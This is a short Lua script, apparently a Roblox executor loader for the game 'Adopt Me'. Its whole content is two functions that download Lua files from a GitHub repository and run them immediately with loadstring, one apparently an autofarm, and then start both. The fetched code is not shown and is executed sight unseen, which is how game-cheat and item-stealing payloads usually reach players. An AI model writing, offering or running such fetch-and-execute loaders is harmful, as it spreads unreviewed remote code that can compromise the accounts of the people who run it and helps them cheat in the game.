local function script()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/Sigmasiaboy/Adoptme/refs/heads/main/main.lua'))()
end
local function farm()

    loadstring(game:HttpGet('https://raw.githubusercontent.com/Sigmasiaboy/Adoptme/refs/heads/main/File.lua'))()
end

task.spawn(script)
task.spawn(farm)
